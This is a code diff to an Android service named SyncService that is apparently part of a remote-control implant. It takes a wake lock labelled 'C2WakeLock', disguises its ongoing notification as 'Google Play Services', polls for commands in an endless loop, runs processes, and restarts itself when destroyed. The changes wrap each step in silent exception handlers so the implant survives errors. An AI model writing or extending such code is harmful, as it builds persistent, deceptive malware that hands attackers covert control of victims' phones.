@@ -34,38 +34,49 @@ class SyncService : Service() {
     }
 
     private fun acquireWakeLock() {
-        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
-        wakeLock = powerManager.newWakeLock(
-            PowerManager.PARTIAL_WAKE_LOCK,
-            "UraniumSupreme::C2WakeLock"
-        ).apply {
-            acquire(10 * 60 * 60 * 1000L)
-        }
+        try {
+            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
+            wakeLock = powerManager.newWakeLock(
+                PowerManager.PARTIAL_WAKE_LOCK,
+                "UraniumSupreme::C2WakeLock"
+            ).apply {
+                acquire(10 * 60 * 60 * 1000L)
+            }
+        } catch (e: Exception) {}
     }
 
     private fun startForegroundServiceNotification() {
+        val manager = getSystemService(NotificationManager::class.java)
+        
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 "Google Play System Framework",
-                NotificationManager.IMPORTANCE_NONE
+                NotificationManager.IMPORTANCE_LOW
             ).apply {
                 description = "خدمة النظام الأساسية"
                 setShowBadge(false)
             }
-            val manager = getSystemService(NotificationManager::class.java)
             manager?.createNotificationChannel(channel)
         }
 
-        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
+        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationCompat.Builder(this, CHANNEL_ID)
+        } else {
+            NotificationCompat.Builder(this)
+        }
+
+        val notification: Notification = builder
             .setContentTitle("Google Play Services")
             .setContentText("System core running...")
             .setSmallIcon(android.R.drawable.ic_menu_manage)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
             .build()
 
-        startForeground(NOTIFICATION_ID, notification)
+        try {
+            startForeground(NOTIFICATION_ID, notification)
+        } catch (e: Exception) {}
     }
 
     private fun initializeCommandLoop() {
@@ -93,9 +104,7 @@ class SyncService : Service() {
                         }
                     }
                     connection.disconnect()
-                } catch (e: Exception) {
-                    // الحفاظ على استمرار النبض
-                }
+                } catch (e: Exception) {}
                 Thread.sleep(10000)
             }
         }
@@ -108,9 +117,7 @@ class SyncService : Service() {
             while (reader.readLine() != null) {}
             reader.close()
             process.waitFor()
-        } catch (e: Exception) {
-            // معالجة صامتة
-        }
+        } catch (e: Exception) {}
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -122,11 +129,13 @@ class SyncService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         wakeLock?.let { if (it.isHeld) it.release() }
-        val restartIntent = Intent(applicationContext, SyncService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(restartIntent)
-        } else {
-            startService(restartIntent)
-        }
+        try {
+            val restartIntent = Intent(applicationContext, SyncService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(restartIntent)
+            } else {
+                startService(restartIntent)
+            }
+        } catch (e: Exception) {}
     }
 }
